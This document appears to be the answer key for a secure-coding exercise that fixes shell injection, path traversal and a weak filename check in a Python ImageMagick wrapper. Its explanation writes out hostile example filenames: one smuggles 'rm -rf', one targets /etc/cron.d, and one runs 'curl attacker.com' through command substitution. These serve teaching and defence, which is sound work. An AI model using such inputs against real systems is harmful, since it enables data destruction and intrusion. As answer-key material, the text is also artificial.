## Reference solution

```python
# ------------------------------------------------------------------------
# ANSWER — Shell Injection via User Filename
# ------------------------------------------------------------------------

import subprocess
import os
import re

ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".bmp"}

def convert_to_png(input_filename: str, output_dir: str) -> str:
    # CHANGE 3: Strip any directory component so only the bare filename is used, then validate it contains only safe characters (alphanumeric, dash, underscore, dot) before any further processing.
    input_filename = os.path.basename(input_filename)
    if not re.fullmatch(r'[\w\-. ]+', input_filename):
        raise ValueError(f"Filename contains disallowed characters: {input_filename}")

    _, ext = os.path.splitext(input_filename)
    if ext.lower() not in ALLOWED_EXTENSIONS:
        raise ValueError(f"Unsupported file type: {ext}")

    base = os.path.splitext(input_filename)[0]
    output_filename = f"{base}.png"
    # CHANGE 2: Resolve the output path and assert it stays inside output_dir, blocking path traversal via `../` in the base name.
    output_path = os.path.realpath(os.path.join(output_dir, output_filename))
    if not output_path.startswith(os.path.realpath(output_dir) + os.sep):
        raise ValueError(f"Output path escapes output directory: {output_path}")

    # CHANGE 1: Pass arguments as a list instead of a shell string so the shell is never invoked and metacharacters in any argument are treated as literals, not shell syntax.
    cmd = ["convert", input_filename, output_path]
    subprocess.run(cmd, shell=False, check=True)

    return output_path
```

## Explanation

### Issue 1: Shell Injection via Unsanitized Filename

**Problem:** When a user uploads a file named `foo.jpg; rm -rf /tmp/uploads`, the function builds the string `"convert foo.jpg; rm -rf /tmp/uploads /out/foo.png"` and hands it to the shell. The shell splits on `;` and runs `rm -rf /tmp/uploads` as a separate command. The ops team saw files disappearing with no errors in the conversion log because ImageMagick's exit code is irrelevant once the shell has already executed the injected command.

**Fix:** Replace the f-string `cmd` with a list `["convert", input_filename, output_path]` and set `shell=False` (which is actually the default, but stated explicitly for clarity). This is the CHANGE 1 site.

**Explanation:** When `shell=True`, Python passes the entire string to `/bin/sh -c`, which interprets `;`, `&&`, `|`, backticks, `$()`, and other metacharacters. When `shell=False` and you pass a list, `subprocess` calls `execvp` directly, forwarding each list element as a literal argument to `convert`. There is no shell in between, so no metacharacter is ever interpreted. A related pitfall: even with a list, if you later join the elements back into a string for logging, do not pass that joined string back to a shell.

---

### Issue 2: Path Traversal in Output Path

**Problem:** A filename like `../../etc/cron.d/evil.jpg` passes the extension check. `os.path.join(output_dir, "../../etc/cron.d/evil.png")` resolves outside `output_dir`, and ImageMagick happily writes the output file there. An attacker can overwrite arbitrary files that the web-app process has write permission to.

**Fix:** After computing `output_path`, call `os.path.realpath` on both it and `output_dir`, then assert the result starts with `output_dir + os.sep`. This is the CHANGE 2 site.

**Explanation:** `os.path.join` does not normalize `..` segments; it merely concatenates strings. `os.path.realpath` resolves symlinks and collapses `..` to give the canonical absolute path. Comparing the canonical output path against the canonical output directory tells you definitively whether the file would land inside the directory. Using `+ os.sep` in the prefix check prevents a directory named `/tmp/uploads-extra` from matching a check intended for `/tmp/uploads`.

---

### Issue 3: Weak Filename Allowlist Lets Metacharacters Through

**Problem:** The original extension check only validates the suffix returned by `os.path.splitext`. A filename like `evil$(curl attacker.com).jpg` ends in `.jpg` so it passes, yet it carries shell metacharacters that cause injection when `shell=True`. Separately, a relative path with `../` components slips through to the output path logic.

**Fix:** At the top of the function, call `os.path.basename` to strip any directory prefix, then apply `re.fullmatch(r'[\w\-. ]+', input_filename)` to reject any filename that contains characters outside the safe set. This is the CHANGE 3 site.

**Explanation:** `os.path.basename` removes everything up to and including the last `/`, which neutralizes directory traversal in the filename itself before any other check runs. The `re.fullmatch` allowlist then ensures only alphanumerics, hyphens, underscores, dots, and spaces remain — every shell metacharacter (`$`, `;`, `|`, `` ` ``, `(`, `)`, `&`, etc.) is rejected outright. This is defense-in-depth on top of the `shell=False` fix: if a future maintainer accidentally reverts to `shell=True`, the input is already sanitized. A pitfall to watch: if your app needs to support Unicode filenames, expand the regex carefully rather than removing the allowlist entirely.
